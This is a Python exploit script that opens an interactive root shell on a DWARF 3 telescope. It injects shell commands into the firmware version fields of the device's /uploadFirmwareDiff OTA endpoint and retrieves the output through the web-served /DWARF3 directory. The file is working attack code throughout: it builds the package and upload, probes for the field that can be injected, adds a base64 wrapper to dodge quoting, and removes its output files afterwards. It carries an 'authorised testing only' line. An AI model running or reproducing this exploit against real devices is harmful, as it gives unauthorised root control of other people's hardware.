#!/usr/bin/env python3
"""
dwarf3_shell.py - interactive root shell on a DWARF 3 via /uploadFirmwareDiff

Each command you type is injected into an unquoted shell command that magni
builds from the OTA version fields and runs through
posix_spawn("/bin/sh","-c",...) at 0x9d2340:

    cp <src> /usrdata/firmware/dwarf3_upgrade_firmware_v<VERSION>.zip
                                                        ^^^^^^^^^
    VERSION = "1.5.4.19; <your command>; #"

stdout/stderr are redirected into /DWARF3/<random>, which nginx serves on
port 80 (location /DWARF3 { root /; autoindex on; }), and the shell fetches
it back. Output is therefore NOT a live tty: each command is one OTA upload
plus one HTTP GET, roughly 2-4 seconds.

Authorised testing only - run this against hardware you own.
"""

import argparse
import base64
import hashlib
import io
import json
import os
import random
import re
import string
import sys
import time
import urllib.error
import urllib.request
import uuid
import zipfile

MODULES = ("iq", "bin", "libs", "config", "mcu", "model")
BANNER = r"""
  dwarf3 root shell   (OTA version-field injection, uid=0)
  commands run via /bin/sh on the device; output via http://<ip>/DWARF3/
  :help for meta-commands, :quit to exit
"""


# ---------------------------------------------------------------- transport

def http(method, url, data=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=data, headers=headers or {},
                                 method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:                                   # noqa: BLE001
        return None, str(e).encode()


def vtuple(v):
    out = []
    for part in v.split("."):
        m = re.match(r"\d+", part)
        if not m:
            break
        out.append(int(m.group()))
    return tuple(out) or None


def get_version(base):
    st, body = http("POST", f"{base}/firmwareVersion", data=b"{}",
                    headers={"Content-Type": "application/json"})
    if st != 200:
        return None
    try:
        d = json.loads(body).get("data", {})
        return ".".join(str(d[k]) for k in ("majorVersion", "minorVersion",
                                            "patchVersion", "buildVersion"))
    except Exception:                                        # noqa: BLE001
        return None


# ---------------------------------------------------------------- packaging

def build_package():
    """Minimal structurally-valid package: six module dirs with explicit
    directory entries (libzip only mkdir's for those) and empty manifests."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for mod in MODULES:
            zi = zipfile.ZipInfo(mod + "/")
            zi.external_attr = (0o40755 << 16) | 0x10
            z.writestr(zi, b"")
        for mod in MODULES:
            z.writestr(f"{mod}/update.json", json.dumps({"fileInfo": []}))
        z.writestr("mcu/update_rgb.json", json.dumps({"fileInfo": []}))
    return buf.getvalue()


def build_multipart(meta, package_name, zip_bytes):
    boundary = uuid.uuid4().hex
    sep = f"--{boundary}\r\n".encode()
    b = io.BytesIO()
    b.write(sep)
    b.write(b'Content-Disposition: form-data; name="firmwareInfo"\r\n')
    b.write(b"Content-Type: application/json\r\n\r\n")
    b.write(json.dumps(meta).encode())
    b.write(b"\r\n")
    b.write(sep)
    b.write(f'Content-Disposition: form-data; name="file"; '
            f'filename="{package_name}"\r\n'.encode())
    b.write(b"Content-Type: application/octet-stream\r\n\r\n")
    b.write(zip_bytes)
    b.write(b"\r\n")
    b.write(f"--{boundary}--\r\n".encode())
    return boundary, b.getvalue()


def upload(base, zip_bytes, old_version, new_version, field,
           update_file_type, device_id=2, package_name=None):
    package_name = package_name or "dwarf3_upgrade_firmware_v1.5.6.0.zip"
    digest = hashlib.md5(zip_bytes).hexdigest()
    meta = {"data": {
        "deviceId": device_id,
        "fileMd5": digest, "fullFileMd5": digest,
        "fileName": package_name, "fileSize": len(zip_bytes),
        "updateFileType": update_file_type, "updateType": 0,
        "newVersion": new_version, "oldVersion": old_version,
    }}
    boundary, body = build_multipart(meta, package_name, zip_bytes)
    st, resp = http("POST", f"{base}/uploadFirmwareDiff", data=body,
                    headers={"Content-Type":
                             f"multipart/form-data; boundary={boundary}",
                             "Content-Length": str(len(body))},
                    timeout=120)
    try:
        return json.loads(resp).get("code")
    except Exception:                                        # noqa: BLE001
        return None


# ---------------------------------------------------------------- execution

def marker():
    return "o" + "".join(random.choice(string.ascii_lowercase + string.digits)
                         for _ in range(10))


class Shell:
    def __init__(self, host, api_port, web_port, outdir, device_id):
        self.base = f"http://{host}:{api_port}"
        self.web = f"http://{host}:{web_port}"
        self.outdir = outdir.rstrip("/")
        self.device_id = device_id
        self.pkg = build_package()
        self.field = None
        self.uft = None
        self.b64 = False
        self.pending_cleanup = None

    # -- build the payload that goes inside the version string -------------
    def payload(self, cmd, out):
        if self.b64:
            enc = base64.b64encode(cmd.encode()).decode()
            inner = f"echo {enc}|base64 -d|sh"
        else:
            inner = cmd
        pre = f"rm -f {self.pending_cleanup};" if self.pending_cleanup else ""
        return f"; {pre}{inner} > {self.outdir}/{out} 2>&1; #"

    def run(self, cmd, settle=2.5, tries=6):
        cur = get_version(self.base)
        if not cur:
            return None, "could not read device version"
        nv = vtuple(cur)
        nxt = ".".join(str(x) for x in nv[:-1] + (nv[-1] + 1,))
        out = marker()
        inj = self.payload(cmd, out)

        old_v, new_v = cur, nxt
        if self.field == "old":
            old_v = cur + inj
        else:
            new_v = nxt + inj

        code = upload(self.base, self.pkg, old_v, new_v, self.field,
                      self.uft, self.device_id)
        time.sleep(settle)
        for i in range(tries):
            st, body = http("GET", f"{self.web}{self.outdir}/{out}")
            if st == 200:
                self.pending_cleanup = f"{self.outdir}/{out}"
                return body.decode("utf-8", "replace"), code
            time.sleep(1.2)
        self.pending_cleanup = None
        return None, code

    # -- figure out which field/mode actually executes ---------------------
    def detect(self):
        canary = marker()
        for field, uft in (("new", 0), ("old", 1), ("new", 2), ("old", 0)):
            self.field, self.uft = field, uft
            print(f"[*] probing inject-field={field} updateFileType={uft} ...",
                  end=" ", flush=True)
            out, code = self.run(f"echo {canary}", settle=3, tries=5)
            if out and canary in out:
                print(f"OK (code={code})")
                return True
            print(f"no (code={code})")
        self.field = self.uft = None
        return False

    def detect_b64(self):
        out, _ = self.run("echo aGVsbG8=|base64 -d")
        self.b64 = bool(out and "hello" in out)
        return self.b64


# ---------------------------------------------------------------- repl

HELP = """meta-commands:
  :help            this text
  :version         read the device firmware version
  :b64 on|off      wrap commands in base64 (survives quotes/metachars)
  :settle N        seconds to wait after upload before fetching (default 2.5)
  :outdir PATH     where stdout is written (must be web-served; /DWARF3)
  :quit            exit
everything else is executed by /bin/sh on the device as root."""


def main():
    ap = argparse.ArgumentParser(description="DWARF 3 interactive root shell")
    ap.add_argument("host", help="device IP, e.g. 192.168.10.173")
    ap.add_argument("--api-port", type=int, default=8082)
    ap.add_argument("--web-port", type=int, default=80)
    ap.add_argument("--outdir", default="/DWARF3",
                    help="device dir that the webserver exposes")
    ap.add_argument("--device-id", type=int, default=2)
    ap.add_argument("--field", choices=("new", "old"),
                    help="skip probing, force the injection field")
    ap.add_argument("--update-file-type", type=int,
                    help="skip probing, force the mode")
    ap.add_argument("-c", "--command", help="run one command and exit")
    args = ap.parse_args()

    sh = Shell(args.host, args.api_port, args.web_port, args.outdir,
               args.device_id)

    ver = get_version(sh.base)
    if not ver:
        sys.exit(f"[!] no version from {sh.base}/firmwareVersion - "
                 f"wrong host/port, or the device is not reachable")
    print(f"[+] device {args.host} firmware {ver}")

    if args.field and args.update_file_type is not None:
        sh.field, sh.uft = args.field, args.update_file_type
        print(f"[*] forced inject-field={sh.field} "
              f"updateFileType={sh.uft} (not verified)")
    elif not sh.detect():
        sys.exit("[!] no working injection path found. The device may be "
                 "patched, or /DWARF3 is not served on "
                 f"{sh.web} - check http://{args.host}/DWARF3/")

    print(f"[+] shell ready via {sh.field}Version, updateFileType={sh.uft}")
    if sh.detect_b64():
        print("[*] base64 wrapper available - quoting is safe")
    else:
        print("[*] no base64 on device - avoid '#' and unbalanced quotes")

    if args.command:
        out, code = sh.run(args.command)
        print(out if out is not None else f"[!] no output (code={code})")
        return

    print(BANNER)
    settle = 2.5
    while True:
        try:
            line = input(f"dwarf3:{sh.outdir}# ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        if line in (":quit", ":exit"):
            break
        if line == ":help":
            print(HELP); continue
        if line == ":version":
            print(get_version(sh.base)); continue
        if line.startswith(":b64"):
            sh.b64 = line.split()[-1] == "on"
            print(f"b64 = {sh.b64}"); continue
        if line.startswith(":settle"):
            settle = float(line.split()[-1])
            print(f"settle = {settle}s"); continue
        if line.startswith(":outdir"):
            sh.outdir = line.split()[-1].rstrip("/")
            print(f"outdir = {sh.outdir}"); continue

        out, code = sh.run(line, settle=settle)
        if out is None:
            print(f"[!] no output retrieved (OTA code={code}). "
                  f"Try :settle 5, or check the command's syntax.")
        else:
            sys.stdout.write(out if out.endswith("\n") or not out else out + "\n")


if __name__ == "__main__":
    main()
